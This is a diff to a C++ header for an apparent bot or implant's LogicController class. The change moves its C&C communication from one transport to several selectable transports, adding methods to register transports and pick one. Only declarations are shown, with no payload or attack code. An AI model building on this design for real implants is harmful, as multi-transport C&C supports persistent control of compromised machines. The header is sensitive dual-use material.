@@ -19,6 +19,8 @@
 #include <boost/thread/thread.hpp>
 #include <boost/thread/mutex.hpp>
 #include <csignal>
+#include <utility>
+#include <random>
 
 // ######## THIS IS CREATED BY CMAKE ########
 #include "all_headers.hpp"
@@ -50,9 +52,9 @@ struct ThreadInfo {
 class LogicController {
  private:
   /**
-   * @brief The method to use for transport
+   * @brief How the framework should select transports.
    */
-  std::string transport_method_;
+  TransportSelectionMethod transport_selection_method_ = NONE;
   /**
    * @brief Modules this bot can run and where they are located
    */
@@ -60,7 +62,7 @@ class LogicController {
   /**
    * @brief The transport, used for C&C communications
    */
-  std::shared_ptr<Transport> transport_;
+  std::vector<std::shared_ptr<Transport>> transports_;
   /**
    * @brief Contains the info for this implant.
    */
@@ -100,6 +102,13 @@ class LogicController {
                           const std::string &func,
                           const std::string &data,
                           const std::string &action_id);
+
+  /**
+   * @brief Get one of the transports to use.
+   * @return A transport to use.
+   */
+  std::shared_ptr<Transport> GetTransportToUse();
+
   /**
    * @brief Used to store if an error occurs in the logic controller.
    */
@@ -140,7 +149,7 @@ class LogicController {
   /**
    * @brief Start the registration process
    */
-  int RegisterBot();
+  void RegisterBot();
 
   /**
    * @brief Start the communication with the C&C server, this is an infinite loop.
@@ -154,17 +163,20 @@ class LogicController {
   void AddModule(const std::string& module);
 
   /**
-   * @brief Set the transportation method for C&C traffic
-   * @param transport The transport method to use
-   */
-  void SetTransportMethod(const std::string& transport);
-
-  /**
-   * @brief Initialize the communication method.
+   * @brief Set the transportation method for C&C traffic.
+   * @param transport The transport method to use.
    * @param hostname Host to connect to for C&C
    * @param port Port, optional for some transports, to connect to for C&C
    */
-  void InitComms(const std::string &hostname, const std::string &port = "");
+  void AddTransportMethod(const std::string &transport,
+                          const std::string &hostname,
+                          const std::string &port);
+
+  /**
+   * @brief Set the transport selection method
+   * @param transport_selection_method The method to use.
+   */
+  void SetTransportSelectionMethod(TransportSelectionMethod transport_selection_method);
 };
 }
 #endif
